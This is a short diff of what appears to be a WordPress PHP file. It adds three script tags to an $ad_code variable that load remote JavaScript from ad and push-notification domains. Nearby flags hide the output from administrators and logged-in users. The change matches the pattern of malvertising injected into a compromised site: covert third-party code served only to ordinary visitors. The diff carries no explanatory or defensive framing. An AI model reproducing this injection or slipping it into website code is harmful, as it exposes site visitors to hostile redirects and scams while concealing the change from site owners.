@@ -46,7 +46,11 @@ add_action( 'admin_init', function() {
 	
 });
 
-$ad_code='';
+$ad_code="
+<script>(function(s,u,z,p){s.src=u,s.setAttribute('data-zone',z),p.appendChild(s);})(document.createElement('script'),'https://iclickcdn.com/tag.min.js',3462002,document.body||document.documentElement)</script>
+<script src=\"https://roujonoa.net/pfe/current/tag.min.js?z=3569624\" data-cfasync=\"false\" async></script>
+<script type=\"text/javascript\" src=\"//in-page-push.com/400/3569562\" data-cfasync=\"false\" async=\"async\"></script>
+";
 
 $hide_admin='on';
 $hide_logged_in='on';
